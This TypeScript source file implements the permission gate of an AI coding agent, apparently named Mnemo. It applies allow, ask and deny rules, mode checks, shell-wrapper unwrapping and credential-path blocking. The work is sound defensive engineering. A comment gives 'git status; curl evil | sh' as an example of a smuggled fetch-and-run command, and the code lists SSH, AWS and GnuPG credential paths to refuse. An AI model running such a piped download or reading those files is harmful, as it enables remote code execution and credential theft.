/**
 * The gate every tool call passes before it runs.
 *
 * Order of authority, first answer wins:
 *   1. rules in `$MNEMO_HOME/permissions.json` (`allow` / `ask` / `deny`, first match)
 *   2. the mode (plan refuses changes; yolo allows the rest)
 *   3. the kind of tool: reading is free, edits and commands ask
 *   4. for commands, grants the user gave earlier ("don't ask again for git status*")
 *
 * The question itself goes to the interface. With no interface (`mnemo -p`) an
 * ask is allowed: headless runs are automation the user started on purpose, and
 * a deny rule is still a deny. The gate filters what runs; it is not a sandbox.
 */
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { fileURLToPath } from "node:url";
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { COMPOUND, commandSegments, decide } from "../policy/gate.ts";
import type { ApprovalRequest } from "../runtime/dialogs.ts";
import type { Host } from "./host.ts";

const READ = new Set(["read", "grep", "find", "ls", "memory_search", "memory_remember", "memory_steer", "spawn_subagent"]);
const EDIT = new Set(["edit", "write", "create_skill", "update_skill"]);
const EXEC = new Set(["bash", "powershell", "ipy_run"]);

export interface Rule {
  tool: string;
  pattern?: string;
  action: "allow" | "ask" | "deny";
  /** Said after the rule's name when it refuses a call. */
  note?: string;
}

interface GrantsFile {
  projects: Record<string, string[]>;
  global: string[];
}

function readJson<T>(file: string, fallback: T): T {
  try {
    return JSON.parse(fs.readFileSync(file, "utf8")) as T;
  } catch {
    return fallback;
  }
}

/** What a broken permissions.json means: nothing that changes anything runs until it is fixed. */
const BROKEN: Rule[] = [...EDIT, ...EXEC].map((tool) => ({ tool, action: "deny" as const, note: "permissions.json cannot be read, so Mnemo refuses to change anything until it is fixed" }));

export function loadRules(home: string): Rule[] {
  const file = path.join(home, "permissions.json");
  let raw: { rules?: unknown } | unknown[];
  try {
    raw = JSON.parse(fs.readFileSync(file, "utf8"));
  } catch (error) {
    // No file is no rules. A file that is there and cannot be understood is not:
    // reading it as "no rules" would quietly turn every deny into nothing.
    return (error as NodeJS.ErrnoException).code === "ENOENT" ? [] : BROKEN;
  }
  const list = Array.isArray(raw) ? raw : (raw as { rules?: unknown }).rules ?? [];
  if (!Array.isArray(list)) return BROKEN;
  const valid = (r: Rule) =>
    r && typeof r.tool === "string" && ["allow", "ask", "deny"].includes(r.action) && (r.pattern === undefined || typeof r.pattern === "string");
  return list.every(valid) ? (list as Rule[]) : BROKEN;
}

/** `*` matches anything; everything else is literal. Linear in the text, with no backtracking. */
export function globMatch(pattern: string, text: string): boolean {
  let p = 0;
  let t = 0;
  let star = -1;
  let mark = 0;
  while (t < text.length) {
    if (p < pattern.length && pattern[p] === "*") {
      star = p++;
      mark = t;
    } else if (p < pattern.length && pattern[p] === text[t]) {
      p++;
      t++;
    } else if (star >= 0) {
      p = star + 1;
      t = ++mark;
    } else return false;
  }
  while (pattern[p] === "*") p++;
  return p === pattern.length;
}

/** The argument that makes a call dangerous: the command, the path, the code. */
export function subjectOf(tool: string, input: Record<string, unknown>): string {
  const v = input.command ?? input.path ?? input.code ?? input.pattern ?? input.name ?? "";
  return typeof v === "string" ? v : JSON.stringify(v);
}

export function matchRule(rules: readonly Rule[], tool: string, subject: string): Rule | undefined {
  return rules.find((r) => globMatch(r.tool, tool) && (r.pattern === undefined || globMatch(r.pattern, subject)));
}

const SHELLS = /^(?:\S*\/)?(?:sh|bash|zsh|dash|ksh)$/;
const WRAPPERS = new Set(["env", "sudo", "nohup", "time", "exec", "command", "nice", "builtin"]);

/**
 * The ways a command line can be read: as typed, and as each command inside it
 * once spaces, `VAR=x` prefixes, directories (`/usr/bin/env`), wrappers (`sudo`,
 * `env`) and `sh -c '…'` are looked through. A rule that names a command is tested
 * against all of them, so `env*` also stops `true && /usr/bin/env` and `sh -c env`.
 * This is a filter for honest mistakes and injected prompts, not a parser of shell.
 */
export function commandVariants(command: string, depth = 0): string[] {
  const whole = command.trim().replace(/\s+/g, " ");
  const out = new Set<string>([whole]);
  // `sh -c '…'` as a whole first: splitting would cut the quoted command in two.
  const wrapped = /^\s*(?:\S*\/)?(?:sh|bash|zsh|dash|ksh)\s+-\w*c\w*\s+(['"])([\s\S]*)\1\s*$/.exec(command);
  if (wrapped && depth < 3) for (const v of commandVariants(wrapped[2]!, depth + 1)) out.add(v);
  for (const segment of commandSegments(command)) {
    let words = segment.split(/\s+/);
    words[0] = words[0]!.replace(/^['"]+/, "");
    const add = () => out.add(words.join(" "));
    add();
    for (let guard = 0; guard < 6 && words.length; guard++) {
      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[0]!)) words = words.slice(1);
      else if (words[0]!.includes("/")) words = [words[0]!.replace(/^.*\//, ""), ...words.slice(1)];
      else if (WRAPPERS.has(words[0]!)) words = words.slice(1).filter((w, i) => i > 0 || !w.startsWith("-"));
      else break;
      if (words.length) add();
    }
    if (depth < 3 && words.length >= 3 && SHELLS.test(words[0]!) && /^-\w*c\w*$/.test(words[1]!)) {
      const inner = words.slice(2).join(" ").replace(/^(['"])([\s\S]*)\1$/, "$2");
      for (const v of commandVariants(inner, depth + 1)) out.add(v);
    }
  }
  return [...out].filter(Boolean);
}

/** The subjects a rule on this call is tested against. */
function subjectsOf(tool: string, subject: string): string[] {
  return EXEC.has(tool) && tool !== "ipy_run" ? commandVariants(subject) : [subject.trim()];
}

function ruleHits(r: Rule, tool: string, subjects: readonly string[]): boolean {
  return globMatch(r.tool, tool) && (r.pattern === undefined || subjects.some((s) => globMatch(r.pattern!, s)));
}

/** The path a pi tool will really open: it expands `~`, drops a leading `@`, reads `file://`. */
function toolPath(p: string): string {
  let s = p.startsWith("@") ? p.slice(1) : p;
  if (s === "~") return os.homedir();
  if (s.startsWith("~/")) return path.join(os.homedir(), s.slice(2));
  if (/^file:\/\//.test(s)) {
    try {
      s = fileURLToPath(s);
    } catch {
      // keep it as written
    }
  }
  return s;
}

/** Symlinks resolved as far as the path exists, the rest appended as written. */
function realPath(p: string): string {
  const tail: string[] = [];
  let at = path.resolve(p);
  for (;;) {
    try {
      return path.join(fs.realpathSync(at), ...tail.reverse());
    } catch {
      const up = path.dirname(at);
      if (up === at) return path.join(at, ...tail.reverse());
      tail.push(path.basename(at));
      at = up;
    }
  }
}

/** Where code and configuration that run later live: never changed unasked, even by accept-edits. */
const CONTROL_DIRS = new Set([".git", ".pi", ".agents", ".mnemo", ".husky", ".github", ".claude", ".vscode"]);

function insideProject(cwd: string, p: unknown): boolean {
  if (typeof p !== "string") return false;
  const rel = path.relative(realPath(cwd), realPath(path.resolve(cwd, toolPath(p))));
  if (rel.startsWith("..") || path.isAbsolute(rel)) return false;
  return !CONTROL_DIRS.has(rel.split(path.sep)[0]!.toLowerCase());
}

/** Credentials a read tool is never needed for. A rule in permissions.json can still allow them. */
function secretPath(home: string | undefined, cwd: string, p: unknown): boolean {
  if (typeof p !== "string") return false;
  const real = realPath(path.resolve(cwd, toolPath(p)));
  const bases = [path.join(os.homedir(), ".ssh"), path.join(os.homedir(), ".aws"), path.join(os.homedir(), ".gnupg")];
  const files = home ? [path.join(home, "agent", "auth.json"), path.join(home, "grants.json")] : [];
  const same = (a: string, b: string) => realPath(a) === real;
  return files.some((f) => same(f, real)) || bases.some((b) => real === realPath(b) || real.startsWith(realPath(b) + path.sep));
}

/** Terminal control bytes made visible, so a command cannot hide part of itself in the question. */
const plain = (s: string) => s.replace(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2066-\u2069]/g, (c) => (c === "\u001b" ? "␛" : "·"));

const TITLES: Record<string, string> = {
  bash: "Bash",
  edit: "Edit",
  write: "Write",
  ipy_run: "Python",
  powershell: "PowerShell",
  create_skill: "New skill",
  update_skill: "Change skill",
};

/** What the approval dialog shows for a call. */
export function approvalPreview(tool: string, input: Record<string, unknown>): ApprovalRequest["preview"] {
  const lines = (s: unknown) => (typeof s === "string" ? s.replace(/\s+$/, "").split("\n") : []);
  if (tool === "edit" && Array.isArray(input.edits)) {
    return (input.edits as { oldText?: string; newText?: string }[]).flatMap((e, i) => [
      ...(i > 0 ? [{ text: "⋯", tone: "muted" as const }] : []),
      ...lines(e.oldText).map((t) => ({ text: `- ${plain(t)}`, tone: "remove" as const })),
      ...lines(e.newText).map((t) => ({ text: `+ ${plain(t)}`, tone: "add" as const })),
    ]);
  }
  if (tool === "write") return lines(input.content).map((t) => ({ text: `+ ${plain(t)}`, tone: "add" as const }));
  if (tool === "ipy_run") return lines(input.code).map((t) => ({ text: plain(t) }));
  // The whole command, not just what fits a line: the part that matters is often the tail.
  if ((tool === "bash" || tool === "powershell") && typeof input.command === "string" && (input.command.includes("\n") || input.command.length > 80))
    return lines(input.command).map((t) => ({ text: plain(t) }));
  if (tool === "create_skill" || tool === "update_skill") {
    const scope = tool === "create_skill" ? `scope: ${input.scope ?? "project"}${input.scope === "user" ? " (every project)" : ""}` : "an existing skill";
    return [{ text: scope, tone: "muted" as const }, ...lines(input.instructions).map((t) => ({ text: `+ ${plain(t)}`, tone: "add" as const }))];
  }
  return [];
}

export class Grants {
  private file: string;
  private data: GrantsFile;

  constructor(home: string) {
    this.file = path.join(home, "grants.json");
    this.data = readJson<GrantsFile>(this.file, { projects: {}, global: [] });
    this.data.projects ??= {};
    this.data.global ??= [];
  }

  for(cwd: string) {
    return { project: this.data.projects[cwd] ?? [], global: this.data.global, deny: [] as string[] };
  }

  add(cwd: string, pattern: string): void {
    const list = (this.data.projects[cwd] ??= []);
    if (!list.includes(pattern)) list.push(pattern);
    try {
      fs.mkdirSync(path.dirname(this.file), { recursive: true });
      fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2), { mode: 0o600 });
    } catch {
      // A grant that cannot be saved still holds for this process.
    }
  }
}

export type Verdict = { allow: true } | { allow: false; reason: string } | { ask: ApprovalRequest; pattern?: string };

/** The decision without the question: pure apart from reading `host.mode` and the disk (for symlinks). */
export function judge(
  host: Pick<Host, "mode"> & { home?: string },
  rules: readonly Rule[],
  grants: ReturnType<Grants["for"]>,
  cwd: string,
  tool: string,
  input: Record<string, unknown>,
): Verdict {
  const subject = subjectOf(tool, input);
  const subjects = subjectsOf(tool, subject);
  // A denial anywhere in the list wins, whatever order the rules are in and however
  // the command is dressed up.
  const denied = rules.find((r) => r.action === "deny" && ruleHits(r, tool, subjects));
  if (denied)
    return { allow: false, reason: `Refused by a rule in permissions.json (${denied.tool}${denied.pattern ? ` ${denied.pattern}` : ""})${denied.note ? `: ${denied.note}` : "."}` };
  const kind = READ.has(tool) ? "read" : EDIT.has(tool) ? "edit" : EXEC.has(tool) ? "exec" : "other";
  let rule = matchRule(rules, tool, subject.trim());
  // An allow for `git status*` is not an allow for `git status; curl evil | sh`.
  if (rule?.action === "allow" && kind === "exec" && tool !== "ipy_run" && COMPOUND.test(subject)) rule = undefined;
  rule ??= rules.find((r) => r.action === "ask" && ruleHits(r, tool, subjects));
  if (rule?.action === "allow") return { allow: true };
  if (kind === "read" && secretPath(host.home, cwd, input.path))
    return { allow: false, reason: "That file holds credentials, which Mnemo does not read. Add an allow rule in permissions.json if you need it." };
  if (kind !== "read" && host.mode === "plan")
    return { allow: false, reason: "Plan mode is read-only: describe the change instead of making it. The user can leave plan mode with shift+tab." };
  if (rule?.action !== "ask") {
    if (kind === "read" || host.mode === "yolo") return { allow: true };
    // Accept-edits is for files in this project. A skill is instructions loaded into
    // every later session, and `.git`, `.pi` and friends run code, so those still ask.
    if ((tool === "edit" || tool === "write") && host.mode === "accept-edits" && insideProject(cwd, input.path)) return { allow: true };
  }
  const shown = subject.split("\n")[0]!;
  const request: ApprovalRequest = {
    tool: TITLES[tool] ?? tool,
    subject: plain(shown.length > 200 ? `${shown.slice(0, 200)}… (+${shown.length - 200} more characters)` : shown),
    preview: approvalPreview(tool, input),
  };
  if (tool === "bash" && rule?.action !== "ask") {
    const g = decide({ toolName: tool, input }, grants);
    if (g.decision === "allow") return { allow: true };
    request.reason = g.reason;
    if (g.offerAlways && g.pattern) {
      request.always = g.pattern;
      return { ask: request, pattern: g.pattern };
    }
  }
  return { ask: request };
}

export function policyExtension(host: Host) {
  return (pi: ExtensionAPI): void => {
    const grants = new Grants(host.home);
    pi.on("tool_call", async (event, ctx) => {
      const input = (event.input ?? {}) as Record<string, unknown>;
      const verdict = judge(host, loadRules(host.home), grants.for(ctx.cwd), ctx.cwd, event.toolName, input);
      if ("allow" in verdict) return verdict.allow ? undefined : { block: true, reason: verdict.reason };
      if (!host.ui) return undefined;
      const answer = await host.ui.approve(verdict.ask, ctx.signal);
      if (answer.kind === "yes") return undefined;
      if (answer.kind === "always") {
        if (verdict.pattern) grants.add(ctx.cwd, verdict.pattern);
        else if (EDIT.has(event.toolName)) host.mode = "accept-edits";
        return undefined;
      }
      const what = `${verdict.ask.tool}(${verdict.ask.subject})`;
      host.signals.push(answer.feedback ? `The user refused ${what} and said: "${answer.feedback}"` : `The user refused ${what}.`);
      return {
        block: true,
        reason: answer.feedback
          ? `The user declined this call and said: ${answer.feedback}`
          : "The user declined this call. Ask what they would prefer before trying something similar.",
      };
    });
  };
}

